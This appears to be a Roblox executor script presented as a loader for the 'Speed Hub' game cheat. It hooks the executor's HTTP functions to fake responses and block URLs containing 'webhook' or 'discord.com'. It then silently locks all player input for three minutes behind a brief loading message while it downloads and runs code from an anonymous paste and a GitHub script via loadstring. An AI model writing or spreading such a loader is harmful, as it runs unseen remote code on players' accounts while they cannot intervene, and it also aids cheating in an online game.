--// Optional: Webhook Request Bypass (Blocks suspicious URLs)
pcall(function()
    if hookfunction then
        local fakeRequest = function() return { StatusCode = 200, Body = "Bypassed" } end
        if request then hookfunction(request, fakeRequest) end
        if http_request then hookfunction(http_request, fakeRequest) end
        if syn and syn.request then hookfunction(syn.request, fakeRequest) end
    end
    
    local blockedEndpoints = { "discord.com", "webhook", "pastebin", "spy" }
    local originalHttpGet = game.HttpGet
    
    if hookfunction then
        hookfunction(game.HttpGet, function(self, url, ...)
            for _, keyword in pairs(blockedEndpoints) do
                if url:lower():find(keyword) then
                    return "-- Blocked suspicious URL"
                end
            end
            return originalHttpGet(self, url, ...)
        end)
    end
end)

--// Theme Colors
local bgColor = Color3.fromRGB(20, 20, 20)
local borderColor = Color3.fromRGB(255, 0, 0)
local textColor = Color3.fromRGB(255, 255, 255)

--// Create Framed Message Box
local function createFramedMessage(name, width, height, initialText)
    local gui = Instance.new("ScreenGui")
    gui.Name = name
    gui.Parent = game:GetService("CoreGui")
    
    local border = Instance.new("Frame")
    border.Size = UDim2.new(0, width + 8, 0, height + 8)
    border.Position = UDim2.new(0.5, -(width + 8)/2, 0.5, -(height + 8)/2)
    border.BackgroundColor3 = borderColor
    border.BorderSizePixel = 0
    border.Parent = gui
    
    local main = Instance.new("Frame")
    main.Size = UDim2.new(0, width, 0, height)
    main.Position = UDim2.new(0, 4, 0, 4)
    main.BackgroundColor3 = bgColor
    main.BorderSizePixel = 0
    main.Parent = border
    
    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, 0, 1, 0)
    label.Position = UDim2.new(0, 0, 0, 0)
    label.BackgroundTransparency = 1
    label.Text = initialText
    label.Font = Enum.Font.SourceSansBold
    label.TextSize = 22
    label.TextColor3 = textColor
    label.TextWrapped = true
    label.TextXAlignment = Enum.TextXAlignment.Center
    label.TextYAlignment = Enum.TextYAlignment.Center
    label.Parent = main
    
    return gui, label
end

--// Block User Input for X Seconds
local function blockUserInput(duration)
    local inputBlocker = Instance.new("ScreenGui")
    inputBlocker.Name = "InputBlocker"
    inputBlocker.IgnoreGuiInset = true
    inputBlocker.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    inputBlocker.Parent = game:GetService("CoreGui")
    
    local blockFrame = Instance.new("TextButton")
    blockFrame.Size = UDim2.new(1, 0, 1, 0)
    blockFrame.Position = UDim2.new(0, 0, 0, 0)
    blockFrame.BackgroundTransparency = 1
    blockFrame.Text = ""
    blockFrame.AutoButtonColor = false
    blockFrame.Modal = true -- Captures all input
    blockFrame.Parent = inputBlocker
    
    task.delay(duration, function()
        if inputBlocker and inputBlocker.Parent then
            inputBlocker:Destroy()
        end
    end)
end

--// Main Logic
blockUserInput(180) -- Block for 3 minutes (180 seconds)

local loadingUI, label = createFramedMessage("ExecutorLoading", 280, 80, "Speed Hub Loading...")
task.wait(3.5)

if loadingUI and loadingUI.Parent then
    loadingUI:Destroy()
end

--// Load Scripts with Error Handling
pcall(function()
    local success1, result1 = pcall(function()
        return game:HttpGet("https://pastefy.app/s10gfCIh/raw")
    end)
    
    if success1 and result1 then
        loadstring(result1)()
    end
end)

pcall(function()
    local success2, result2 = pcall(function()
        return game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true)
    end)
    
    if success2 and result2 then
        loadstring(result2)()
    end
end)
